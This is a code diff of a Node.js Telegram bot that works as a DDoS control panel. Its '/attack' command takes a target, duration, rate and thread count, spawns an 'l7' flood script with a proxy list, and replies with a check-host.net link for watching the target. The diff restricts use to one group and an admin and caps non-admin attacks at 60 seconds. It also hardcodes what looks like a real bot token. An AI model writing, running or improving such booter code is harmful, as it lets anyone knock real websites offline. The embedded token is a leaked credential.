@@ -5,14 +5,14 @@ const si = require('systeminformation')
 
 const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc'
 const ADMIN_ID = 6601930239
-const ALLOWED_GROUP = 'deptraiaiyeu'
-
+const GROUP_USERNAME = 'deptraiaiyeu'
 const bot = new TelegramBot(TOKEN, { polling: true })
+
 const app = express()
 const PORT = process.env.PORT || 3000
 
-app.get('/', (req, res) => res.send('Bot hoạt động'))
-app.listen(PORT, () => console.log(`Cổng ${PORT}`))
+app.get('/', (req, res) => res.send('Bot is running'))
+app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
 
 bot.onText(/\/system/, async (msg) => {
   const chatId = msg.chat.id
@@ -36,39 +36,47 @@ bot.onText(/\/system/, async (msg) => {
 bot.on('message', (msg) => {
   const id = msg.chat.id
   const text = msg.text?.trim()
-  const senderId = msg.from.id
-  const isAdmin = senderId === ADMIN_ID
-  const isAllowedGroup = msg.chat.username === ALLOWED_GROUP
+  const userId = msg.from.id
+  const username = msg.chat.username
 
   if (!text) return
 
-  if (text.startsWith('/attack')) {
-    if (!isAdmin && !isAllowedGroup) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Bạn không có quyền dùng lệnh này" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-      return
-    }
+  const isFromAllowedGroup = msg.chat.type === 'supergroup' && username === GROUP_USERNAME
+  const isAdmin = userId === ADMIN_ID
 
+  if (!isFromAllowedGroup && !isAdmin) return
+
+  if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
     if (args.length !== 4) {
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
-    const [target, timeRaw, rate, thread] = args
-    const time = parseInt(timeRaw)
+    const [target, timeStr, rate, thread] = args
+    const time = parseInt(timeStr)
+
     if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Invalid args" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Invalid arguments" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
     if (!isAdmin && time > 60) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Thời gian tối đa cho người dùng thường là 60s" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Attack time must be ≤ 60 seconds" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
     try {
-      const cmd = spawn('node', ['l7', target, time.toString(), rate, thread, 'proxy.txt'])
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ status: "Running", target, time, rate, thread }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      const cmd = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt'])
+      const response = {
+        status: "Attack Started!",
+        target,
+        time,
+        rate,
+        thread,
+        checkhost: `https://check-host.net/check-http?host=${target}`
+      }
+      bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', { parse_mode: 'Markdown' })
 
       cmd.on('error', err => {
         bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
@@ -80,6 +88,8 @@ bot.on('message', (msg) => {
     } catch (err) {
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     }
+
+    return
   }
 })
 
